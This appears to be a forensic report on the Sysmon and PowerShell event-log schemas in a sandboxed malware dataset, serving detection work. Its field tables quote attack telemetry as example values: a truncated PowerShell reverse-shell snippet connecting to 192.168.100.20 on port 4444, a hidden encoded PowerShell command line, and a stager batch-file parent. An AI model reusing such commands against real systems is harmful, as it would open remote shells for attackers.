# Windows Event Log (EVTX) Schema & Event Inventory

**Date:** 2026-09-22  
**Investigation Scope:** Deep parsing of all 90 EVTX files (`sysmon.evtx` and `powershell.evtx` across 45 runs) using pure-binary / `win32evtlog` COM queries.  
**Status:** COMPLETE — EMPIRICAL VERIFICATION OF ACTUAL EVENT IDS AND XML FIELDS.

---

## 1. Overview of EVTX Evidence

Each of the 45 execution runs in `Dataset/` contains exactly two EVTX log files:
1. `sysmon.evtx` (6.3 MB to 9.7 MB; 4,617 to 9,702 events per file).
2. `powershell.evtx` (15.8 MB; 528 to 615 events per file).

Total EVTX files: **90 files** across 45 runs.

---

## 2. Sysmon EVTX Schema (`sysmon.evtx`)

- **Log Provider:** `Microsoft-Windows-Sysmon/Operational`
- **Total Events per Run:**
  - Benign (`RUN-1100`): 4,617 events
  - PowerShell Fileless (`RUN-001`): 6,159 events
  - Process Hollowing (`RUN-100`): 6,854 events
  - Cobalt Strike (`RUN-400`): 7,818 events
  - LOLBins Abuse (`RUN-800`): 9,183 events
  - Empire Framework (`RUN-1000`): 9,702 events

### 2.1 Event ID Distribution in `sysmon.evtx`

| Event ID | Event Name | Occurrences per Run | Percentage | Presence in Benign | Presence in Malware | Forensic Significance |
|---|---|---|---|---|---|---|
| **Event ID 1** | **Process Create** | **2,165 to 4,717** | ~48.5% | **YES** | **YES** | **PRIMARY COMMAND SOURCE**. Contains exact command-line arguments, parent process, hashes, and user token. |
| **Event ID 5** | **Process Terminate** | **2,194 to 4,810** | ~49.0% | **YES** | **YES** | Tracks process lifecycle, execution duration, and exit codes. |
| **Event ID 3** | **Network Connection** | **243 to 404** | ~2.5% | **YES** | **YES** | **PRIMARY NETWORK TELEMETRY SOURCE**. Records source/destination IP, port, protocol, and initiating process image. |
| **Event ID 4** | Sysmon Service State | 7 | <0.1% | YES | YES | Administrative service start/stop timestamps. |
| **Event ID 16** | Sysmon Config Change | 4 | <0.1% | YES | YES | Configuration filter hash checks. |
| **Event ID 255** | Sysmon Error Event | 4 | <0.1% | YES | YES | Operational logging diagnostics. |

### 2.2 Detailed Field Schema for Sysmon Event ID 1 (Process Create)

Every Event ID 1 record contains 23 structured XML data fields:

| Field Name | Datatype | Example Value | Description / Relevance |
|---|---|---|---|
| `CommandLine` | `string` | `"powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAg..."` | **CRITICAL NLP INPUT**. Full raw command line with parameters. |
| `Image` | `string` | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | Target binary executed. Identifies LOLBins. |
| `ParentCommandLine` | `string` | `"C:\Windows\system32\cmd.exe /c start payload.bat"` | Parent process command line. Detects stagers. |
| `ParentImage` | `string` | `C:\Windows\system32\cmd.exe` | Parent binary path. Identifies abnormal parentage. |
| `CurrentDirectory` | `string` | `C:\Users\User\AppData\Local\Temp\` | Working directory at invocation. |
| `Hashes` | `string` | `SHA256=4C4C7E6080...` | Cryptographic hashes of target binary. |
| `IntegrityLevel` | `string` | `Medium`, `High`, `System` | Process privilege elevation level. |
| `LogonGuid` / `LogonId` | `string` | `{a2b3c4d5-...}` / `0x3e7` | Session logon identifier. |
| `ParentProcessId` | `integer` | `3412` | Operating system PPID. |
| `ProcessId` | `integer` | `4896` | Operating system PID. |
| `TerminalSessionId` | `integer` | `1` | Interactive desktop session (1) vs Service session (0). |
| `User` | `string` | `DESKTOP-VM\SandboxUser`, `NT AUTHORITY\SYSTEM` | Invoking security identity. |
| `UtcTime` | `datetime` | `2026-09-19 12:50:29.124` | High-resolution timestamp. |

### 2.3 Detailed Field Schema for Sysmon Event ID 3 (Network Connection)

Every Event ID 3 record contains 18 structured XML data fields:

| Field Name | Datatype | Example Value | Description / Relevance |
|---|---|---|---|
| `DestinationIp` | `string` | `192.168.100.1`, `192.168.100.20` | Remote C2 IP or sandbox gateway address. |
| `DestinationPort` | `integer` | `8000`, `4444`, `5355` | Remote port. Flags non-standard ports (e.g. 8000, 4444). |
| `DestinationPortName` | `string` | `http-alt`, `llmnr`, `mdns` | Service protocol name. |
| `DestinationHostname` | `string` | `c2-listener.local` | Reverse DNS or SNI hostname if resolved. |
| `Image` | `string` | `...\powershell.exe`, `...\svchost.exe` | Process making the outbound network connection. |
| `Initiated` | `boolean` | `true` | Indicates outbound client initiation (`true`) vs listening inbound (`false`). |
| `ProcessId` | `integer` | `4896` | Owning process PID. |
| `Protocol` | `string` | `tcp`, `udp` | Transport layer protocol. |
| `SourceIp` | `string` | `192.168.100.15` | Local sandbox VM IP. |
| `SourcePort` | `integer` | `58291` | Ephemeral local source port. |
| `User` | `string` | `DESKTOP-VM\SandboxUser` | User identity originating connection. |
| `UtcTime` | `datetime` | `2026-09-19 12:50:31.054` | Connection establishment timestamp. |

---

## 3. PowerShell Operational EVTX Schema (`powershell.evtx`)

- **Log Provider:** `Microsoft-Windows-PowerShell/Operational`
- **Total Events per Run:** 528 to 615 events per run.

### 3.1 Event ID Distribution in `powershell.evtx`

| Event ID | Event Name | Occurrences per Run | Percentage | Significance |
|---|---|---|---|---|
| **Event ID 4104** | **ScriptBlock Logging** | **444 to 508** | ~84.0% | **GOLD STANDARD SCRIPT TELEMETRY**. Captures de-obfuscated script blocks dynamically evaluated in memory. |
| **Event ID 40961** | Engine Lifecycle (Started) | 25 | ~4.5% | PowerShell runtime host startup. |
| **Event ID 40962** | Engine Lifecycle (Stopped) | 25 | ~4.5% | PowerShell host exit. |
| **Event ID 53504** | Pipeline Execution | 25 | ~4.5% | Cmdlet execution pipeline logs. |
| **Event ID 4100** | Execution Warning | 9 | ~1.5% | Script policy enforcement warnings. |

### 3.2 Detailed Field Schema for PowerShell Event ID 4104 (ScriptBlock Logging)

| Field Name | Datatype | Example Value | Description / Relevance |
|---|---|---|---|
| `ScriptBlockText` | `string` | `"$client = New-Object System.Net.Sockets.TCPClient('192.168.100.20', 4444); $stream = $client.GetStream(); ..."` | **THE CORE PAYLOAD EVIDENCE**. Full unencoded PowerShell script executed in RAM, even if launched via `-Enc` or string concatenation! |
| `ScriptBlockId` | `string` (UUID) | `c9b74735-829d-476a-93be-ef87e74c8b21` | Unique identifier tracking multi-chunk scripts. |
| `MessageNumber` | `integer` | `1` | Chunk index for scripts exceeding 32 KB. |
| `MessageTotal` | `integer` | `1` | Total chunks comprising the full script block. |
| `Path` | `string` | `""` (empty for memory-only) or `C:\Temp\stager.ps1` | File path. If empty, the script was executed **directly from memory / stdin / download cradle**. |

---

## 4. Root Cause of Previous Model Failure & Fix

In earlier training cycles, `forensics/extraction/command_extractor.py` crashed because `win32evtlog` COM bindings were misconfigured or lacked channel permissions in the execution shell, causing it to fall back to:
```python
raw_command_text = "C:\\Windows\\system32\\cmd.exe /c \"C:\\Program Files\\HP\\HP Touchpoint Analytics Client\\hpatchmonTask.cmd\""
```
The empirical discovery above proves that:
1. `sysmon.evtx` contains **2,165 to 4,717 genuine process execution commands per run**.
2. `powershell.evtx` contains **444 to 508 genuine in-memory script blocks per run**.
3. Sourcing command evidence from these EVTX logs using pure binary parsing (`python-evtx` or robust `EvtQueryFilePath`) completely eliminates any need for fallback strings.
